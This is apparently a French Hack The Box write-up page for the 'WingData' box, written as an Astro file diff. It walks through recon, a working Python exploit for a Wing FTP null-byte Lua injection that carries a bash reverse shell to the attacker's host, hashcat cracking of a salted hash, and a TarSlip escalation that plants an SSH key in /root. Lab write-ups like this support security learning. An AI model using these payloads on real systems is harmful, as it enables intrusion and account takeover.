@@ -1,0 +1,156 @@
+---
+import Layout from '../../layouts/Layout.astro'
+---
+<Layout title="HTB - WingData">
+
+  <div style="margin-bottom:2rem;">
+    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
+    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">HTB - WingData</h1>
+    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
+      <span class="badge-easy">Easy</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#94a3b8; font-size:0.82rem;">Linux (Debian)</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#475569; font-size:0.8rem;">14 Feb 2026</span>
+    </div>
+    <div style="display:flex; flex-wrap:wrap; gap:0.35rem; margin-top:0.5rem;">
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2025-47812</span>
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2025-4138</span>
+      <span style="background:rgba(239,68,68,0.1); color:#f87171; border:1px solid rgba(239,68,68,0.25); padding:2px 8px; border-radius:4px; font-size:0.7rem; font-weight:700;">CVE-2025-4517</span>
+    </div>
+  </div>
+
+  <div style="background:var(--bg-800); border-left:3px solid #27ae60; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
+    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
+    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">Box Easy Linux — Null Byte RCE dans Wing FTP Server v7.4.3 via injection Lua dans les fichiers de session, crack d'un hash SHA-256 salé depuis un fichier XML de configuration, puis escalade via TarSlip (PATH_MAX bypass) pour injecter une clé SSH dans /root.</p>
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
+    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
+      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase;">Chaîne d'exploitation</div>
+      {[
+        { n:'1', v:'CVE-2025-47812 — Wing FTP Null Byte RCE', r:'Shell wingftp' },
+        { n:'2', v:'Lecture wacky.xml + Hashcat mode 1410', r:'SSH wacky + user flag' },
+        { n:'3', v:'CVE-2025-4138 — TarSlip PATH_MAX bypass', r:'Clé SSH injectée dans /root → root flag' },
+      ].map((s,i,a) => (
+        <div style={"display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);" + (i<a.length-1?"border-bottom:1px solid #0d0d15;":"")}>
+          <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#27ae6022; color:#27ae60; border:1px solid #27ae6044;">{s.n}</div>
+          <div><div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">{s.v}</div><div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ {s.r}</div></div>
+        </div>
+      ))}
+    </div>
+  </div>
+
+  <div class="prose">
+
+    <h2>1 — Reconnaissance</h2>
+    <pre is:raw>echo "10.129.244.106 wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
+nmap -sC -sV -p- -T4 10.129.244.106
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian
+80/tcp open  http    Apache 2.4.66 → redirect wingdata.htb</pre>
+    <p>La page principale redirige vers le portail ftp.wingdata.htb/login.html. En bas de page : <strong>Wing FTP Server v7.4.3</strong> (vulnérable — version 7.4.4 corrige CVE-2025-47812).</p>
+
+    <h2>2 — CVE-2025-47812 : Null Byte RCE</h2>
+    <p>Wing FTP stocke les sessions sous forme de fichiers Lua exécutés par dofile(). Un null byte (\x00) dans le champ username corrompt le fichier de session et permet d'y injecter du code Lua arbitraire exécutant un reverse shell.</p>
+    <pre is:raw>#!/usr/bin/env python3
+import urllib.request, urllib.parse, http.cookiejar
+
+TARGET = "http://ftp.wingdata.htb"
+LHOST  = "10.10.14.51"
+LPORT  = "4444"
+
+jar = http.cookiejar.CookieJar()
+opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
+opener.open(f"{TARGET}/login.html").read()
+
+payload = f'anonymous\x00"]]..os.execute(\'bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"\')\'\n--[['
+
+data = urllib.parse.urlencode({
+    "username": payload, "username_val": payload,
+    "password": "",      "password_val": "",
+}).encode()
+
+req = urllib.request.Request(f"{TARGET}/loginok.html", data=data, method="POST")
+opener.open(req).read()
+opener.open(f"{TARGET}/dir.html").read()  # Déclenchement</pre>
+    <pre is:raw>nc -lvnp 4444
+python3 exploit.py
+
+# Shell reçu en tant que wingftp
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+
+cat /home/ben/user.txt  # user flag</pre>
+
+    <h2>3 — Pivot vers wacky (Hashcat mode 1410)</h2>
+    <p>Énumération des fichiers XML de configuration utilisateurs Wing FTP :</p>
+    <pre is:raw>find /opt /var /home -name "*.xml" 2>/dev/null
+# /opt/wftpserver/Data/1/users/wacky.xml
+# /opt/wftpserver/Data/1/users/john.xml
+
+cat /opt/wftpserver/Data/1/users/wacky.xml
+# Balise &lt;Password&gt; : hash SHA-256 salé
+# Algorithme : sha256($pass.$salt) avec sel WingFTP
+# Mode Hashcat : 1410</pre>
+    <pre is:raw>hashcat -a 0 -m 1410 \
+  "&lt;HASH&gt;:WingFTP" \
+  /usr/share/wordlists/rockyou.txt --force
+# Status: Cracked
+
+ssh wacky@10.129.244.106
+cat ~/user.txt</pre>
+
+    <h2>4 — CVE-2025-4138 : TarSlip PATH_MAX Bypass → root</h2>
+    <pre is:raw>sudo -l
+# (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</pre>
+    <p>Le script utilise tarfile.extractall() sans validation des chemins. En construisant un TAR malveillant avec une chaîne de symlinks dépassant PATH_MAX (4096 octets), il est possible d'écrire dans des chemins arbitraires avec les privilèges root.</p>
+    <pre is:raw>ssh-keygen -t ed25519 -f ~/wingdata_key -N ""
+
+# Script exploit_tar.py (CVE-2025-4138) — construit le TAR malveillant
+# Chaîne de symlinks : chaque lien pointe vers un dossier long,
+# créant un chemin cumulé > PATH_MAX qui sort du répertoire d'extraction
+python3 exploit_tar.py
+# → /tmp/backup_888.tar (injecte authorized_keys dans /root/.ssh/)
+
+mv /tmp/backup_888.tar /opt/backup_clients/backups/
+sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
+     -b backup_888.tar -r restore_win123
+
+ssh root@127.0.0.1 -i ~/wingdata_key
+cat /root/root.txt</pre>
+
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      {[
+        'Wing FTP < 7.4.4 : toujours vérifier la version affichée en bas de page du portail',
+        'Les fichiers XML de configuration Wing FTP stockent des hashes craquables',
+        'Mode Hashcat 1410 pour sha256($pass.$salt) — identifier l\'algorithme exact avant de lancer',
+        'tarfile.extractall() sans filter= est vulnérable au TarSlip (CVE-2025-4138)',
+        'Injecter une clé SSH dans /root/.ssh/authorized_keys via TarSlip = escalade propre',
+      ].map(l => (
+        <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>{l}</div>
+      ))}
+    </div>
+  </div>
+
+  <div>
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
+    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
+      {['nmap','python3 (Null Byte exploit)','netcat','hashcat','ssh-keygen','python3 (TarSlip exploit)'].map(t => (
+        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
+      ))}
+    </div>
+  </div>
+
+  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
+    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
+    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
+  </div>
+
+</Layout>
